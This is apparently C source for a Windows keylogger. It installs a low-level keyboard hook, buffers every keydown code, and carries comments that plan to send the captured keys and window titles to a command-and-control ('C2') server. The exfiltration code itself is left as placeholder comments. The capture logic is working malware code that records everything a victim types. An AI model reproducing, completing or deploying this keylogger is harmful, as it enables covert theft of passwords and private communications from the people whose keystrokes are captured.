#include <Windows.h>
#include "callback.h"

// Initialize a handle to the currently active window 
HWND CurrentWindow = GetForegroundWindow();

UINT Buffer[1024] = {0};
SIZE_T Index = 0;

// Store key event in the buffer
void StoreKeyEvent(UINT VirtualKeyCode)
{   
    if (Index != 1024) 
    {
        Buffer[Index] = VirtualKeyCode;
        Index++;
    }
    else
    {
        // Send data to C2 if it's full
    }
}


LRESULT CALLBACK CaptureKeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {   
            // Store the key event into the buffer
            StoreKeyEvent(kbdStruct->vkCode);
        }

        if (GetForegroundWindow() != CurrentWindow)
        {
            // Send the key event buffer to the C2, along with the previous' window title
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int main()
{   
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, CaptureKeyEvent, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);

    return 0;
}